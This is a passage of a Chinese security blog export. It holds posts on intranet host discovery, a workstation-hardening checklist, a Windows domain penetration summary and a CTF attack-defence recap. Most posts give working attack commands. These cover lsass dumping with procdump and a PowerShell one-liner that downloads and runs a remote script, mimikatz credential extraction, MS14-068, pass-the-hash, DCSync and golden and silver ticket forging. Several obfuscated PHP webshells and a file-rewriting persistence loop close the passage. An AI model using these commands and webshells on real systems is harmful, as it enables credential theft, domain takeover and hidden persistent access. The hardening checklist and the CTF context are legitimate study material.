nmap-7.40.tar.bz2 | tar xvf -# cd nmap-7.40 # ./configure 这里可以用--prefix指定安装路径# echo $?# make# make install# echo $?# make install# echo $? # nmap -sn -PR 192.168.1.0/24 尝试arp扫描 处在别人的vpn内网(kali) 123456789101112netdiscover -r 192.168.1.0/24 -i eth0msf的arp扫描模块msf &gt; use auxiliary/scanner/discovery/arp_sweepmsf &gt; show optionsmsf &gt; set interface eth0msf &gt; set smac 00:0c:29:92:fd:85msf &gt; set rhosts 192.168.1.0/24msf &gt; set threads 20msf &gt; set shost 192.168.1.27msf &gt; run meterpreter 123meterpreter &gt; getsystem 另外,在目标机器上扫描时,务必先提权(个人建议,会方便很多),不然扫描过程中可能会有些问题meterpreter &gt; run autoroute -s 192.168.1.0/24meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24 基于smb和netbios的内网主机发现方式win下:1nbtscan.exe -m 192.168.1.0/24 非常经典的小工具 linux下:123456wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgztar -zxvf nbtscan-source-1.0.35.tgzmakeecho $?./nbtscan -h./nbtscan -m 192.168.1.0/24 域内扫描12net viewdsquery computer 其实,域内最好用的也就是nbtscan了 Ps:如果计算机名很多的时候，可以利用bat批量ping获取ip1234567@echo offsetlocal ENABLEDELAYEDEXPANSION@FOR /F &quot;usebackq eol=- skip=1 delims=\&quot; %%j IN (`net view ^| find &quot;命令成功完成&quot; /v ^|find &quot;The command completed successfully.&quot; /v`) DO (@FOR /F &quot;usebackq delims=&quot; %%i IN (`@ping -n 1 -4 %%j ^| findstr &quot;Pinging&quot;`) DO (@FOR /F &quot;usebackq tokens=2 delims=[]&quot; %%k IN (`echo %%i`) DO (echo %%k %%j)))]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>系统安全,内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全鸡]]></title>
    <url>%2F2017%2F07%2F%E5%AE%89%E5%85%A8%E9%B8%A1%2F</url>
    <content type="text"><![CDATA[在日常的工作生活中，如何打造一个相对安全的环境，这是值得思考及解决的问题。 0x00 前言从事安全行业或者喜欢研究安全技术的人员，建议如下搭建环境。 两张网卡两条不同线路（可多）； 统一使用英文系统； 物理机脱网，设置加密盘； 不同虚拟机设置不同线路（ 日常上网一条，日常工作一条）； 编程机器不要带入个人 ID； 工作机不安装任何带有母语信息的软件； 所有机器补丁打满； 虚拟机关机即还原； 略…. 以下如无特殊说明，均为 Windows 7虚拟环境，详细情况如下。 0x01 个人电脑1) 时间同步通常为了得到更加精确的时间信息，我们会采用将 Windows 时间与网络时间进行同步操作来实现。但是如果在被反日的过程中发现使用了时间同步功能，那基本就可以确定所在地区，所以为了更友好，就需要关闭这项功能。 点击桌面右下角时间，然后在弹出的窗口中点击更改日期和时间设置 在出现的窗口上部的选项选择Internet 时间 接下来选择更改设置 去除与 Internet 时间同步，再点击确定就行了。 2) win7关闭同步中心 Win+R – regedit 打开注册表 在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Syncmgr\Handlers项中找到一个与SQL Server 2000 相关的分支 删除它，这时任务栏里的同步中心图标应该会消失，重启以后同步中心也不会自动启动了。 当然，如果你有其它同步项，比如没有禁用离线文件，或者有移动设备同步，都有可能使同步中心自动启动。 3) update大多数朋友可能会遇上 Win 7 系统关机时出现自动更新延长关机时间，导致有急事无法快速关机拔电源。但要说的不是这回事，仔细了解 update 背后的故事，都懂得。同时调出本地组策略编辑器 Win+R – gpedit.msc 打开组策略编辑器 找到管理模板 /Windows 组件 找到 Windows Update，开启那啥。 4) 打印机 在控制面板中的管理工具中找到服务 在其中找到 Print Spooler 将服务停掉也可以直接在命令行下执行 net stop spooler 5) 摄像头最保险的办法的就是直接禁用摄像头的驱动了。 右击电脑桌面上的“计算机”图标选择“属性”选项; 设备管理器 图像设备，找到我们笔记本内置的摄像头 直接右击禁用即可 6) 麦克风关闭方法： 首先在电脑桌面右下角任务栏上的声音图标上右键，然后选择“录音设备”。 之后在弹出的声音属性对话框，将鼠标放在“麦克风”上右键选择“禁用”即可（或点击属性进行选择）。 这样我们就简单禁用了录音设备麦克风了，不影响声卡，依然可以正常播放音乐，只是不能再录音以及语音说话了。 7) USB自动读取禁止 usb 设备的自动运行，首先是出于安全考虑，再者按需运行，减少不必要的程序开启。 8) 小娜（windows 10）使用毛豆就可以。 0x02 个人意识1) 安全上网不在工作机上登陆私人账户 2) 密码分级很多人各网站用户名密码相同，这样黑客用被泄露网站的密码登录其他网站很有可能会成功，每个网站都设置不同的密码可能不现实，那就可以对密码就行分级管理。 3) 文件删除如果是平时的删除则使用强制删除，Shift+del。电脑出售或者移交其他人使用，删除敏感文件后，同样需要对硬盘脱密，使用脱密工具反复擦写5次以上。 4) 文件加密存储Windows 的话本身的 BitLocker 就很不错。个人使用 TrueCrypt ，文件直接放在硬盘上，电脑丢失后硬盘上文件就可以被直接读取，如果存到加密盘中，拿到硬盘后必须输入加密盘密码加载加密盘才能看到其中的文件，就有效避免了重要文件泄密。 5) 软件下载最好是到该软件官网下载，校验MD5值，避免出现捆马现象。校验方法：1certutil -hashfile 文件名 MD5 6) 软件更新弹出更新框，关掉，去官网下载新版进行安装。 7) 数据备份 个人电脑上的重要数据要定期备份到服务器或移动硬盘 备份时注意数据要加密，建议使用加密盘，备份整个加密盘原始文件 8) 邮箱工作邮箱文件及时删除（前提是备份好文件） 9) 桌面安全同事之间工作内容、工作性质不同，有权知晓的信息内容、信息密级也有所不同。离开电脑时记得锁屏，快捷键为Win+L桌面文件不可以存在敏感文件，敏感文件需要放在加密盘 0x03 网络物理机脱网处理，虚拟机使用桥接模式，接入不同网卡 –&gt; 网线。 加密盘放在物理机内，整盘加密或者部分文件加密都是选择对象。 文本文件处理都在隔断网络的物理机上，毕竟各种钓鱼。 1) WIFI安全只能说，不是自己的WIFI就不要连接，毕竟、毕竟、毕竟只要是 WIFI 名字相同就能随意连接的年代，有点慌。建议： 日常不用 WIFI 时关闭手机和笔记本的无线局域网功能，以防止自动连接恶意 WIFI ； 当手机或笔记本连接上 WIFI 后，留意连接到的 WIFI 热点名称 3) 强制通过VPN上网,VPN断线就断网部分工作机是需要这样的机制，至于为什么，嗯。 https://www.t00ls.net/thread-38739-1-1.htmlhttps://www.t00ls.net/viewthread.php?tid=38860&amp;extra=&amp;page=1 待续…]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网渗透归纳（持续更新）]]></title>
    <url>%2F2017%2F06%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[内网渗透，最重要得是定位问题。所以前期的调研和收集是非常重要的一项工作。标：本文多数内容是整合的知识点。 0x00 前期基本信息探测尽可能详细得分析出网段信息、各部门ip段、重点找出IT运维部、OA、邮箱服务器、人力资源管理等。最后画一张组织结构图，这样在内网定位的时候，无论是针对内网查找资料还是针对特殊任务都是非常实用的一项技术。不过信息收集，不是一天两天就能完成的事情，这种事情要持之以恒。 一、人事组织结构图demo: 思路：这种人事图，除了在外部站点上有，也可以到首页去查找关于我们，有一些简单的说明，然后再去招聘网找各式的岗位名称，最后连蒙带猜（没有这样的操作），收集尽量精确能到各个人员。当然，想要详细，就得通过不同的渠道获取。 二、ip分布思路： 一般大公司有内部门户系统，可通过内部门户系统公开链接找出部门ip段（如果找到路由也很惊喜）； 内网中可通过路由器、交换机等设备命令执行、snmp、弱口令获取网络拓扑； DNS域传送信息泄漏； 0x01 切入点（起点） Web门户系统getshell –&gt; system权限； 邮件服务器； 邮件服务器获取信息中得出VPN账密和IP地址； 路由器建立VPN进入； 社工上线； 待更新… 0x02 靶机信息收集主要针对三种： 基于命令形式的，包括权限信息，机器信息，进程端口，网络连接，共享、会话等等； 基于应用与文件形式的，例如一些敏感文件，密码文件，浏览器，远程连接客户端等； 还有一种是最直接的，例如抓取本地明文与hash，键盘记录，屏幕记录等。 网上已经有大量相关的资源与文章了，这里就不再占篇幅了，只说点额外的不常见技巧。 一、命令行形式包括但不限于一下几点 （一）常用命令123456789101112hostname #主机名systeminfo #系统信息（所在域，开机时间，安装信息，补丁情况，系统版本）set #环境变量net user #查看默认用户net view #显示当前域或工作组中计算机的列表net localgroup #查看用户组net localgroup Administrators #查看Administrators组所有用户(包括隐藏用户)query user #查看当前会话（window7 64以上）tasklist /v #显示当前进程和进程用户net config workstation #查看当前登陆用户信息net statistics workstation #查看主机开机时间net share #查看共享文件夹 （二）不常用命令12345678910whoami /all 查看Mandatory Label看我们是否过uacnet session 查看有没有远程连过来的sessioncmdkey /l 看是否保存了登陆凭证.（凭据管理器）echo %logonserver% 查看登陆域net stitastics server 查看登陆时间Wmic 能让攻击者大量利用来获取系统信息的系统自带工具 wmic qfe list #获取补丁信息Netsh 做端口转发spn –l administrator 域内查某个用户spn记录dsquery | nltest 域内信息收集 二、应用与文件形式虽然标题不错，但是内容只是去翻文件，包括一些应用的配置文件，密码文件等。有时候会碰到一些加密的office办公软件，例如word,excel 这些。 如果是低版本如2003的话，攻击者会在百度搜一些网上的破解软件进行破解（会联网）。如果是高版本的话，往往在目标用户开着文件时使用微软SysinternalsSuite套装中的procdump将内存dump回去，用内存查看器直接查看文件内容。 因此就算有些敏感文件加密了照样能够被攻击者获取敏感信息。 三、hash和明文这一步使用mimikatz基本就足够了，也分exe、dll与ps三个版本，分情况使用，但免杀是个问题。 （一）从 sam 中提取目标系统本地用户密码 hash使用reg将sam、system和security文件导出来，并拖回本地。 12345678910# &gt;cd Desktop# Desktop&gt;reg save HKLM\SYSTEM system.hivThe operation completed successfully.# Desktop&gt;reg save HKLM\SAM sam.hivThe operation completed successfully.# Desktop&gt;reg save HKLM\SECURITY sercrity.hivThe operation completed successfully. PS：本地复原机器与目标机器务必一致。复原结果： 这个方法在某些情况下有奇效。 （二）通过 dump lsass.exe 进程数据离线免杀抓明文的各种方式1、procdump.exe12C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bitsC:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits 本地还原 123mimikatz.exesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full 2、PowerShell123# Public&gt;powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1');"Get-Process lsass | Out-Minidump"或者本机执行# Public&gt;powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\Users\Public\Out-Minidump.ps1'; Get-Process lsass | Out-Minidump&#125;" PS：Out-Minidump.ps1有C# 版本SharpDump。 3、SqlDumper如果目标系统上安装了Windows SQL Server，SqlDumper.exe默认存放在c:\Program Files\Microsoft SQL Server\number\Shared，其中number代表sql server的版本。 123456140 for SQL Server 2017130 for SQL Server 2016120 for SQL Server 2014110 for SQL Server 2012100 for SQL Server 200890 for SQL Server 2005 当然，如果没有安装有Windows SQL Server的话，可以自己上传一个SqlDumper.exe 上去。 使用方法： 12345678910111213141516171819202122232425262728293031323334c:\Users\Public&gt;tasklist /svc |findstr lsass.exe&quot;lsass.exe 512 SamSsc:\Users\Public&gt;SqlDumper-2016.exe 512 0 0x01100Parsed parameters: ProcessID = 512 ThreadId = 0 Flags = 0x120 MiniDumpFlags = 0x1966 SqlInfoPtr = 0x0000000000000000 DumpDir = &lt;NULL&gt; ExceptionRecordPtr = 0x0000000000000000 ContextPtr = 0x0000000000000000 ExtraFile = &lt;NULL&gt; PatternForExtraFiles = &lt;NULL&gt; InstanceName = &lt;NULL&gt; ServiceName = &lt;NULL&gt;Remote process didn&apos;t specify a dump file nameTarget suspendedCallback type 11 not usedCallback type 15 not usedCallback type 7 not usedMiniDump completed: SQLDmpr0001.mdmpTotal Buffer pool data pages filtered out: 0 KBTotal Hekaton data pages filtered out: 0 KBTotal Free memory (from non top level allocators) filtered out: 0 KBTotal top level free memory filtered out: 0 KBTotal Log pool memory filtered out: 0 KBLocation of module &apos;dbghelp.dll&apos; : &apos;C:\Windows\system32\dbghelp.dll&apos;File version of module &apos;C:\Windows\system32\dbghelp.dll&apos; : &apos;6.1:7601.17514&apos;Product version of module &apos;C:\Windows\system32\dbghelp.dll&apos; : &apos;6.1:7601.17514&apos;GetModuleHandle () Failed 0x7e - The specified module could not be found.Watson Invoke: No （三）关于 windows 10 / 2012r2 以后系统的明文密码抓取方式在windows 10 / 2012之后的系统版本中，默认情况下是禁用了在内存缓存中存储系统用户明文密码。此时使用mimikatz去抓取密码，会显示null。 解决办法为：修改注册表–&gt; 抓取windows server 2012 &amp; 2016 &amp; win8明文密码。 0x03 网络环境的判断 机器所处位置区域的判断; 机器角色的判断; 进出口流量是否连通的判断，是否出的去，进的来。 一、位置的判断位置判断是指机器处于网络拓扑中的某个区域，是在DMZ区，办公网，还是核心区，核心DB等多个位置，当然这里的区域并不是绝对的，只是大概的一个环境，不同的地方网络环境不一样，区域的界限也不一定明显。 二、角色的判断机器角色的判断指判断已经控制的机器是普通Web服务器、开发测试服务器、公共服务器、文件服务器还是代理服务器、DNS服务器、存储服务器等等。具体的判断是通过对机器内的主机名、文件、网络连接等多种情况进行综合判断的。 三、连通性的判断出口流量是否连通的判断指机器是否能上外网这些，要综合判断协议（tcp\http\dns\icmp等协议）与端口(常见能出去的端口有80,8080,443,53,110,123等)。在这里还有一种是网络内网设置了代理服务器的情况，攻击者通常会查看环境变量set，主机名是否有proxy字样的机器，注册表是否有写明代理地址或指定pac代理文件等。 0x04 横向渗透如果是workgroup横向，攻击者会尝试web漏洞挖掘、密码猜解、嗅探等，方法不是特别的多。如果是domain横向，方法就比较多了，在workgroup横向多了例如AD2008 gpp 、ms14-068 、kerberoast 和配置错误等。 一、默认权限配置认知1234567[+]普通机器允许Console：administrator组（domain admins），users组（domain users），backup operators组允许rdp：administrator组（domain admins），Remote desktop users组[+]域控AD允许Console：administrator组，backup operators组，account operators组，print operators组，server operators组允许rdp：administrator组，Remote desktop users组 如果出现配置错误，那就是权限配置问题。 tips：当某些普通\不普通用户加入AD的rdp组或其他管理员组，当攻击者拿到这些用户的权限时就相当于可以获取到域控制器的权限了。 二、代理转发渗透测试-之-代理篇 三、工作组横向工作组横向的方法、花样要比域环境少得多。 工作组一般都是个人机和少数服务器。通常使用的方法有： 扫描网段中的web服务，个人机可能会存在一些默认的基础环境，供个人测试使用。比如：phpStudy、AppServ、XAMPP，这些基本都是默认配置； MS17-010，补丁号为KB4013389； hash抓取 –&gt; hash注入、IPC登陆 –&gt; hash碰撞； 在无凭证的条件下使用Responder； ARP嗅探/欺骗攻击（Cain和Ettercap）–&gt; 不推荐使用； 会话劫持； 最佳助攻 –&gt; 社会工程学； 待更新…. 四、域环境横向（单域）（一）域内信息探测 Windows环境常用命令12345678910net user /domain #查看域用户net view /domain #查看有几个域net view /domain:XXX #查看此域内电脑net group /domain #查询域里面的组net group &quot;domain computers&quot; /domain #查看加入到域内的所有计算机名net group &quot;domain admins&quot; /domain #查看域管理员nltest /dclist:xxx #查看域控制器net group &quot;domain controllers&quot; /domain #查看域控制器net user hacker /domain #获得指定账户的详细信息net accounts /domain #获得域密码策略设置，密码长短，错误锁定等信息 dsquery 命令 查询 AD1234567891011dsquery computer - 查找目录中的计算机。dsquery contact - 查找目录中的联系人。dsquery subnet - 查找目录中的子网。dsquery group - 查找目录中的组。dsquery ou - 查找目录中的组织单位。dsquery site - 查找目录中的站点。dsquery server - 查找目录中的 AD DC/LDS 实例。dsquery user - 查找目录中的用户。dsquery quota - 查找目录中的配额规定。dsquery partition - 查找目录中的分区。dsquery * - 用通用的 LDAP 查询来查找目录中的任何对象。 Net系列命令获取域内信息123456789Csvde/ldifde/dsquery/adfind/ldapsearch #探测更详细信息使用`Get-SPN`（powershell脚本LDAP中快速查询符合指定得用户、组、或者SPN服务名称）Nslookup -type=SRV_ldap._tcp #(寻找域控)tasklist /v #列出进程和进程所有者（看是否有域管登陆）PowerView #（powershell脚本 辅助找寻定位关键用户，查看域管在线机器）WinScanX.exe #远程信息刺探Winfo.exe #遍历远程用户名nmap smb-enum-sessions.nse #（引擎来获取远程机器的登陆session，并且不需要管理权。）netview.exe`#(它利用`NetSessionEnum`来寻找登陆sessions，利用`NetShareEnum`来找寻共享，利用`NetWkstaUserEnum`来枚举登陆的用户) linux cat /etc/nsswitch看看密码登陆策略，我可以看到使用了file ldap模式 less /etc/ldap.confbase ou=People,dc=unix-center,dc=net找到ou,dc,dc设置 查找10条用户记录ldapsearch -h 192.168.2.2 -x -z 10 -p指定端口 查看NFS连接showmount -e ip 查找管理员信息匿名方式1ldapsearch -x -D &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -b &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -h 192.168.2.2 有密码形式1ldapsearch -x -W -D &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -b &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -h 192.168.2.2 （二）域管权限获取除了工作组的那几种方法外，还有专属域环境的渗透方式. 1、组策略漏洞（GPP）域管理员使用GPP来配置和操作域，常见的操作有远程创建本地用户、映射打印机、映射磁盘等，这些操作有时候需要提供账号密码。当组策略进行分发时，会在SYSVOL目录下生成一个xml文件，理所当然的前面提供的账号密码都保存在这个xml文件中，而密码是经过AES加密得，也就是说完全可逆的加密算法，而微软同时也很照顾的公布了加密密钥，所以任何域普通用户就可以读取这些xml文件并使用公开的AES密钥破解密码。组策略漏洞是windows 2008的，而且不一定是groups.xml，其他的xml也可能存在密码。 1dir \\domain.com\sysvol\* 2、KERBEROS协议漏洞常见的三种共计方法：MS14-068，Golden ticket（黄金票据），SILVER TICKET（白银票据） 简单介绍下Kerberos协议的工作方法： 客户机将明文密码进行ntlm哈希,然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc（域控）,kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket) 将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中tgt数据 然后客户机将tgt发送给域控制器KDC请求TGS（票证授权服务）票证，并且对tgt进行检测 检测成功之后，将目标服务账户的ntlm以及tgt进行加密，将加密后的结果返回给客户机。 （1）ms14-068Benjamin Delpy(Mimikatz的作者)写了一个MS14-068的利用工具，叫Kekeo,是PyKEX的升级版。它能够找到并定位有漏洞的域控，在打了补丁（KB3011780）和有2012/2012R2域控得情况下仍能凑效。 在利用MS14-068之前，建议先使用klist /purge清除服务器端缓存的Kerberos凭据，且使用域控地址不使用IP。 PyKEK 准备条件 1234域用户及其口令 （攻击主机可使用其他域用户信息，比如可以在主机A上用域用户B的口令及sid攻击）域用户对应sid （whoami /all）域控地址操作系统要求Win7及以上，这是因为XP不支持导入Ticket 利用方法: 1234ms14-068.exe -u -p -s -d # 生成vuln.ccacheklist /purge # 清除内存中的Ticketkerberos::ptc vuln.ccache # 导入vuln.ccacheklist # 查看是否导入 Kekeo Kekeo快捷用法仅需要以下参数（使用方法）： 123域用户及其口令域控地址ms14068.exe /domain:vuln.local /user:utilisateur /password:waza1234/ /ptt 下载地址：https://github.com/gentilkiwi/kekeo/releases #####（2）另外两种作为权限固守使用 待续…. 3、相同密码登陆（hash碰撞）hash碰撞实际上就是利用hash传递来盲打。 如果内网主机的本地管理员账户密码相同且允许本地账户登陆域内其他机器。 在域环境中，利用pass the hash的渗透方式往往是这样的： 123451.获得一台域主机权限；2.Dump内存获取用户hash（或明文）；3.通过pass the hash 或 pass the ticket尝试登陆其他主机；4.继续收集hash或明文，并尝试远程登陆；5.知道获得域管理员hash，登陆域控，最终成功控制整个域。 域登陆缓存mscash使用reg命令提取sam、system、securit，然后用creddump7或者mimakatz提取mscash。 4、利用漏洞配置不当获取更多主机权限 常见应用漏洞：struts2、zabbix、axis、ImageMagic、fastcgi、Shellshock、redis未授权访问、Hadoop、weblogic、jboss、WebSphere、Coldfusion 常见语言反序列化漏洞php、Java、python、ruby、node.js 数据库漏洞及配置不当mssql Get-SQLServerAccess、MySQL低版本hash登陆、MySQL低版本Authentication Bypass、域内mssql凭证获取密码、monggodb未授权访问、memcache配置不当 内网中很多web应用存在常见漏洞、使用有漏洞的中间件和框架、弱口令及配置不当（注入、任意文件读取、备份、源码泄漏（rsync、git、svn、DS_Store）、代码执行、xss、弱口令、上传漏洞、权限绕过…） web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql...） 系统备份文件（ghost）中读密码 在已有控制权限主机中，查看各浏览器书签、cookie、存储密码、键盘记录收集相关敏感信息、查询注册表中保存密码、读取各客户端连接密码、putty dll注入、putty密码截取、ssh连接密码，以获取更多主机权限推荐工具：NetRipper、Puttyrider.exe、ProwserPasswordDump.exe、LaZagne.exe ms08-067远程溢出（极少能碰到） cmdkey /list 远程终端可信任连接连接netpass.exe读取该密码 arp欺骗中间人攻击（替换sql数据包、认证凭证获取、密码获取极大不到万不得已不会用） WPAD中间人攻击（全称网络代理自动发现协议、截获凭证该种方法不需要ARP欺骗，比较好用的一种方法（使用Responder.py/net-creds.py）） 翻阅相关文件及以控制数据库中可能存储配置口令（别忘了回收站） 用已有控制权限的邮箱账号以及前期所了解到的信息进行欺骗（社会工程学） 定向浏览器信息ip信息定向挂马（0day） 用以收集的密码（组合变换密码）对各服务进行爆破 应用0day攻击… 5、远程命令执行方式例如at\schtasks\psexec\wmic\sc\ps网上有很多相关资源也不占篇幅了，只提一个很少提的。从2012r2 起，他们开了一个端口叫5985，原理跟大家常说的powershell remote是一样的，基于winrm服务，于是可以这样执行。又是一个系统自带的远程管理工具。1winrs -r:192.168.22.33 -u:administrator -p:p@assw0rd ipconfig 6、Exchange略…. 7、滥用基于资源约束委派略…. 8、NTLM中继略…. （三）目标定位在有域控权限的条件下，需要找到某台机器（服务器、个人机、数据库） 我们首先先将所有的域用户的详细信息都列举出来，通过详细名称（Full Name）确认其域用户。【域渗透】批量Net-User。12dsquery user - 查找目录中的用户。dsquery computer - 查找目录中的计算机。 我们将上面的两条命令的执行结果结合起来进行归类。然后通过域控日志查找登陆IP或者机器。当然，除了日志还有别的方式，不限于日志。【域渗透】获取域环境内用户登录信息找到机器或者IP之后，可通过域管理员或者用其域用户进行登陆。登陆的方式也是有多重，上面有讲过。 但是，也有些机器是登陆不上的。我们可以通过设置域登陆脚本进行操作。【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本 后续待更新、、、 五、域之间、域森林域信任关系。 六、权限维持（一）Pass The Ticket获取权限后可使用wmic.vbs进行操作。 1cscript wmiexec.vbs /shell dc-01.vuln.local 1、Export the ticket在我们成功获得域控权限后，就可以导出域控内存中的Ticket，在默认的10个小时以内都可以利用来登录域控。 12mimikatz # sekurlsa::tickets /export # 导出Ticketmimikatz &quot;kerberos::ptt C:\test\[0;2d87a]-2-0-40e00000-a@krbtgt-Vuln.LOCAL.kirbi&quot; # 在普通域用户机器上执行 Tips： 1264位系统使用ptt功能要用32位的mimikatz，如果用64的mimikatz，那么无法导入Ticket这种方式导入的Ticket默认在10小时以内生效 2、Golden Ticket（黄金票据）Golden Ticket是伪造的TGT(Ticket Granting Ticket)–&gt;票据授权票据，所以可以获取任何Kerberos服务权限。 每个用户的Ticket都是由krbtgt用户的密码Hash来生成的，如果我们拿到了Krbtgt的密码Hash，就可以随意伪造Ticket。 （1）导出krbtgt的Hash在域控上执行 12#!bashmimikatz log &quot;lsadump::dcsync /domain:vuln.local /user:krbtgt&quot; 生成mimikatz.log记录输出，使用log输出是为了方便复制Hash值 提取所需信息： 123/domain：test.local/sid:S-1-5-21-4155807533-xxxxxx-2767329826 /aes256:af71a24ea463446f9b4c645e1bfexxxxxx70c7d785df10acf008xxxxxx5e682f （2）生成Golden Ticket伪造的用户设置为test，执行以下命令生成文件gold.kirbi 123mimikatz &quot;kerberos::golden /domain:vuln.local /sid:S-1-5-21-4155807533-xxxxxx-2767329826 /aes256:af71a24ea463446f9b4c645e1bfexxxxxx70c7d785df10acf008xxxxxx5e682f /user:test /ticket:test.kirbi&quot; Tips：生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash （3）导入Golden Ticket1kerberos::ptt test.kirbi Tips: 123这种方式导入的Ticket默认在20分钟以内生效，当然，如果过期了，再次ptt导入Golden Ticket就好可以伪造任意用户，即使其不存在krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码 3、Silver Ticket（白银票据）Silver Ticket是伪造的TGS(Ticket Granting Server)–&gt;票据授权服务器，所以也叫service ticket，只能访问指定的服务权限。 比如现在要访问域控上的cifs服务（cifs服务用于Windows主机间的文件共享） （1）所需条件123456/domain/sid/target:目标服务器的域名全称，此处为域控的全称/service：目标服务器上面的kerberos服务，此处为cifs/rc4：计算机账户的NTLM hash，域控主机的本地计算机账户/user：要伪造的用户名，此处可用silver测试 （2）使用方法1mimikatz &quot;kerberos::golden /domain:vuln.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:dc-01.vuln.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt&quot; 成功导入，就可以访问域控上的文件共享。 如果要访问域控上的LDAP服务 只需要把/service的名称改为LDAP，/user改为krbtgt，/rc4改为krbtgt的NTLM HASH 1mimikatz &quot;kerberos::golden /domain:vuln.local /sid:S-1-5-21-4155807533-xxxxxx-2767329826 /target:dc-01.vuln.local /service:LDAP /rc4:d5304f9ea69523479xxxxxxebb5a2155 /user:krbtgt /ptt&quot; 导入成功，但是无法访问域控的文件共享服务，因为范围有限，只能访问指定的服务权限。 但是，执行以下命令可以远程访问LDAP服务来获得krbtgt的信息: 1mimikatz &quot;lsadump::dcsync /dc:dc-01.vuln.local /domain:vuln.local /user:krbtgt&quot; 所以可以获取任何Kerberos服务权限。 注： 1234lsadump::dcsync向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户只读域控制器默认不允许读取用户密码数据 参数选项： 123/user - 要查询的用户id 或 SID/domain（可选的）默认设置为当前域。/dc（可选的）指定DCSync 连接的域控位置 当然还有其他可作Silver Ticket的服务 （二）三好学生师傅的文章域渗透——Security Support Provider 域渗透——Skeleton Key 域渗透——Hook PasswordChangeNotify …. （三）域内配置ACL后门及检测清理（四）windows后门种植方式收集 0x05 整合参考更多资料请参考以下文章 黑客游走于企业windows内网的几种姿势 内网渗透——网络环境的判断 深入解读MS14-068漏洞：微软精心策划的后门？ 域渗透之横向移动 域渗透——Pass The Hash &amp; Pass The Key windows后门种植方式收集 域渗透——Pass The Ticket How Attackers Use Kerberos Silver Tickets to Exploit Systems 域内配置ACL后门及检测清理]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>内网</tag>
        <tag>系统安全</tag>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF线下攻防赛总结]]></title>
    <url>%2F2017%2F06%2FCTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[本着最后一次参加线下赛，这时间安排也是让人很无语。将这一份总结留给学弟他们，涨涨经验。 一张常规的CTF线下攻防思维导图 SSH登陆两三个人进行分工，一个粗略的看下web，有登陆口的话，就需要修改密码，将情况反馈给队友，让登陆ssh的小伙伴进行密码的修改，改成炒鸡复杂、然后将Web目录下载下来，上WAF、文件监控、端口扫描。将这几个工作分工好，顺序就像图上。 tips：将下载下来的Web目录理一遍，看是否有可疑的文件夹，比如bak。依然记得有次比赛，有两台靶机，赛组提示弱口令。然后每一支队伍都奔着后台去了，结果有队伍在Web目录下发现了这个bak目录，打开发现是phpmyadmin，提示的弱口令是在这里用上。 网络拓扑首先先理清好网络拓扑关系，节点与各链路之间的关联。这个需要下一步配合，要不然不知道对手在哪就GG。示例： 主机发现如果是在同个C段，或者B段，均可以使用RouterScan进行对80端口扫描进行扫描得出，嫌麻烦的话，就用httpscan这个小巧的脚本 千万要记得扫端口，这很重要。用nmap也行，自己写的脚本或者网上找的也行。 预留后门有的比赛环境，为了照顾比较菜的选手（此处举手），预留了一句话后门。将整个web目录下载到本地，使用hm.exe、D盾或者别的扫描工具可以扫描得出（如果预留） 黑盒测试 防御及修复建议1.将所有的登陆口密码进行修改（炒鸡复杂）；2.将上传页面的action地址修改为*，（机智小能手！！）；3.反序列化和命令执行，就去seebug或其他的站点找补丁；4.待补充… 一句话控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。简单举例：1&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt; 连接方式：php?2=assert密码是1。献上我常用得一句话12345678&lt;?php$a=chr(96^5);$b=chr(57^79);$c=chr(15^110);$d=chr(58^86);$e='($_REQUEST[C])';@assert($a.$b.$c.$d.$e);?&gt; 配置为?b=))99(rhC(tseuqeR+lave 123&lt;?php $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;['n985de9'];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=连接密码:0（零） 权限维持1234567891011121314&lt;?php set_time_limit(0); ignore_user_abort(true); $file = '.demo.php'; $shell = "&lt;?php phpinfo();?&gt;"; while(true)&#123; file_put_contents($file, $shell); system('chmod 777 .demo.php'); usleep(50); &#125;?&gt; 